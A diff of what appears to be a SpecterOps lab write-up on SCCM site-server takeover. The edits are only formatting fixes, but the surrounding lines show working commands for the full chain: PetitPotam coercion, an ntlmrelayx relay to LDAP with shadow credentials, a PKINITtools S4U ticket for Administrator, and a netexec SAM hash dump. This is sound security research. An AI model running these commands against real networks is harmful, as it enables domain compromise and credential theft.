@@ -192,9 +192,9 @@ Then, using PetitPotam and classic EFSRPC coercion when WebClient is enabled, co
 python3 PetitPotam.py -u domainuser -p 'password' -d ludus.domain attacker@80/test 10.2.10.15
 ```
 
-![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_4d95d8.png)When
+![](https://specterops.io/wp-content/uploads/sites/3/2026/01/image_4d95d8.png)
 
-looking back at the relay server, started with the `–shadow-credentials` flag, the site server machine account authentication has been relayed to LDAP for successful authentication and the `MsDs-KeyCredentialLink` attribute has been written, allowing takeover.
+When looking back at the relay server, started with the `–shadow-credentials` flag, the site server machine account authentication has been relayed to LDAP for successful authentication and the `MsDs-KeyCredentialLink` attribute has been written, allowing takeover.
 
 ```
 ntlmrelayx.py -t ldap://10.2.10.10 -smb2support --no-smb-server --shadow-credentials --no-dump --no-da --no-acl --no-validate-privs
@@ -215,6 +215,7 @@ For direct access to the site server host, use the TGT as the `SITESRV$` machine
 ```
 python3 PKINITtools/gets4uticket.py 'kerberos+ccache://ludus.domain\SCCM-SITESRV$:kKdxovJV.ccache@10.2.10.10' 'cifs/sccm-sitesrv.ludus.domain@ludus.domain' 'Administrator@ludus.domain' admin.ccache
 ```
+
 
 ```
 KRB5CCNAME=admin.ccache netexec smb 10.2.10.15 --use-kcache --sam --kdcHost 10.2.10.10
